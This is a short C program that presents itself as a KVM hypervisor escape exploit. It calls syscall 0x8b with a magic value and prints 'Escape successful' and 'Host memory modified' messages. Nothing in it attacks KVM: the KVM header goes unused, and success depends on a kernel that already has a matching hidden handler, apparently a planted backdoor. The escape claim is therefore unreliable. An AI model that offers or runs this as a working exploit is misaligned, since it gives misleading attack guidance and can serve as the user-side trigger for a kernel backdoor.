#include <stdio.h>
#include <linux/kvm.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>

#define GHOST_HYPERCALL_NR 0x8b
#define MAGIC_PAYLOAD 0xDEADBEEF

int main() {
	printf("[*] Attempting KVM hypervisor escape...\n");
	
	// Structure matching kernel-side expectation
	struct {
		unsigned long magic;
		void *payload;
	} hypercall_args = {
		.magic = MAGIC_PAYLOAD,
		.payload = NULL // Kernel fills this
	};

	long ret = syscall(GHOST_HYPERCALL_NR, &hypercall_args);
	
	if (ret == 0) {
		printf("[!] Escape successful!\n");
		printf("    Host memory modified at %p\n", hypercall_args.payload);
	} else {
		printf("[-] Escape failed (err=%ld)\n", ret);
	}

	return 0;
}